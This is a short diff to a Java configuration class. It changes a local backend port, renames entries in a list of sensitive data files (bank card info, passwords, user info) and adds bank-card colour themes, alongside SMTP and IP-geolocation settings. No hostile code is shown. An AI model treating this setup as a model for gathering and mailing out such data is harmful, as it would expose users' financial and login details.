@@ -12,7 +12,7 @@ public class ConfigFile {
     // services
     public static String myEmailSMTPHost = "smtp.163.com";
     public static String apiGeoSP = "http://ip-api.com/json/";
-    public static String backendPost = "http://127.0.0.1:8174/";
+    public static String backendPost = "http://127.0.0.1:8080/";
     public static String connectTestUrl = "http://www.google.com";
 
     // paths
@@ -41,8 +41,13 @@ public class ConfigFile {
     };
 
     public static String[] sensitiveDataFileList = {
-            "bankCardInfo.txt",
-            "password.txt",
-            "userInfo.txt"
+            "bankCardInfo1.txt",
+            "password1.txt",
+            "userInfo1.txt"
     };
+
+
+    // bankCardThemes
+    public  static  String[] bankCardTheme1 =  {"#dddddd", "#000000"};
+    public  static  String[] bankCardTheme2 = {"#dddddd", "#000000"};
 }
